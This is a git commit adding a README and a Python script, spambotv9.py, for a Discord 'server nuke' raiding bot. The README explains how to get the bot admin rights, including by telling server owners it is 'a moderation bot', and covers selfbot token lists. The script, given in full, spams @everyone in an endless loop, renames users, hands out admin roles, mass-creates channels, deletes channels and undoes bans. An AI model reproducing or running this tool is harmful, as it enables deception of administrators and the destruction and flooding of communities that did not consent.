a5a767c2f6e6b2c32d0a124615c7dbcdb5a0dd09
noname5s <gamingtarikulbg@gmail.com>
2021-10-12 19:05:38 +0600

    main

---
+++ README.md
@@ -0,0 +1,79 @@
+
+# discord-server-nuke
+This project is abandoned because I made it when I was a python programming noob and it is extremely inefficient.
+
+BEFORE YOU GET PISSED AT ME:
+I created this using debian 10. I have heard it does not work too well on windows. From what I have heard, it just doesn't do anything. 
+However, in the future I will be creating a much better and faster gui raiding tool that can be used on windows. 
+
+destroyer of discord servers
+
+btw a lot of this shit is against the ToS
+
+HOW TO USE spambotv9.py (for dumbasses):
+
+First, download the .py file, make sure you have the modules installed.
+
+
+Replace the INSERT TOKEN HERE with your bot token, which can be obtained in the developer api.
+
+(you need to create a bot in the api first)
+
+
+in the Oauth2 bar, scroll down to the checkbox and click bot. Another new checkbox should appear below.
+
+Scroll down again. Click administrator in this checkbox.
+
+Then, go back to the top checkbox and copy the link.
+
+You can paste the link into your browser to invite the bot to a discord server that you have bot invite privileges on.
+
+If you don't have invite privileges, you can still give the link to a server owner/admin and tell them "it is a moderation bot" or something
+
+If the server owner/admin is dumb enough, they will add the bot to the server
+
+
+When you are ready, type this into the command line (replace filename with the files name):
+
+python3 filename.py
+
+The bot will begin running and any message in the discord server will start the bot spam pinging.
+
+
+It is most effective when you type messages into every channel possible to get the bot spamming everyone in more than one channel
+
+It may not work if the bot gets reported (in this case, just make a new bot) or you are banned from the discord developer api
+
+ALWAYS GET THE NEWEST VERSION OF THE BOT CODE IF POSSIBLE
+
+feel free to submit suggestions and improvements in the issues section!
+
+~~~~~
+EPIC FEATURES
+-Spam-messages any channel that a message is sent in
+-Spams admin logs
+-Gives anyone who sends a message an admin role (super chaotic)
+-Spam-creates roles until it reaches max (250)
+-Spam-creates text channels until it reaches max (500)
+-Changes its nickname and other users nicknames to random letters rapidly, making it exponentially harder to kick the bot
+-Unbans anyone who gets banned
+-Deletes all original text channels that people send messages in
+~~~~~
+INSTRUCTIONS FOR SELFBOTS (for retarded skids who can barely read this):
+
+IF YOU ARE USING singleuserspammer.py JUST PUT THE TOKEN IN THE FILE
+
+IF YOU ARE USING multi-selfbot.py YOU MUST CREATE A FILE IN THE SAME DIRECTORY CALLED tokens.txt - IT SHOULD LIKE LIKE THIS WITH A TOKEN ON EACH LINE:
+
+njnognsobneoiwr.gsrhwrhghe-srnrhwrhwrh
+
+ewhteghtegrgrgwg.gwrhwrhrwh-gwrjyrytqegeh
+
+fewrhwhwrhrw.grwhwrgwegh-ewheththegdg
+
+
+
+
+
+
+ALSO, tokenfilter.py IS MEANT TO BE RUN IN THE SAME DIRECTORY AS tokens.txt AND IT DELETES ALL OF THE INVALID ONES
---
+++ spambotv9.py
@@ -0,0 +1,63 @@
+import os
+import discord
+import time
+import random
+import string
+from discord.utils import get
+
+def randomletters(length):
+    letters = string.ascii_letters
+    return ''.join(random.choice(letters) for i in range(length))
+
+TOKEN = ("INSERT TOKEN HERE")
+
+client=discord.Client()
+
+@client.event
+async def on_ready():
+    print('connected to Discord!')
+
+@client.event
+async def on_member_ban(guild,user):
+    await guild.unban(user)
+    print("removed ban")
+    
+@client.event
+async def on_message(message):
+    response = 'JOIN THE UPRISING https://github.com/Supergamer5465/discord-server-nuke https://github.com/Supergamer5465/discord-server-nuke/blob/master/README.md https://github.com/Supergamer5465/discord-server-nuke/blob/master/spambotv5.py https://github.com/Supergamer5465/discord-server-nuke/blob/master/spambotv4.1.py https://github.com/Supergamer5465/discord-server-nuke/blob/master/spambotv4.py ⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻ @everyone'
+    x=100
+    while int(x)==100:
+        print("message sent "+random.choice(string.ascii_letters))
+        try:
+            await message.channel.send(response)
+        except:
+            print("message error")
+            pass
+        try:
+            user=message.author
+            await user.edit(nick=randomletters(3))
+        except:
+            print("can't change user nick")
+            pass
+        guild=message.guild
+        perms=discord.Permissions(administrator=True)
+        try:
+            user=message.author
+            await guild.create_role(name='TEST', colour=discord.Colour(0x597E8D),permissions=perms)
+            role=get(guild.roles,name='TEST')
+            await user.add_roles(role)
+        except:
+            print('maximum number of roles reached')
+            pass
+        guild=message.guild
+        await guild.create_text_channel(randomletters(99))
+        await guild.create_text_channel(randomletters(99))
+        await message.channel.delete()
+        print("channel yeeted")
+        user=message.author
+        
+@client.event
+async def on_guild_channel_create(channel):
+    await channel.send(''.join(random.choice(string.ascii_lowercase) for i in range(1990)) + " @everyone")
+
+client.run(TOKEN)
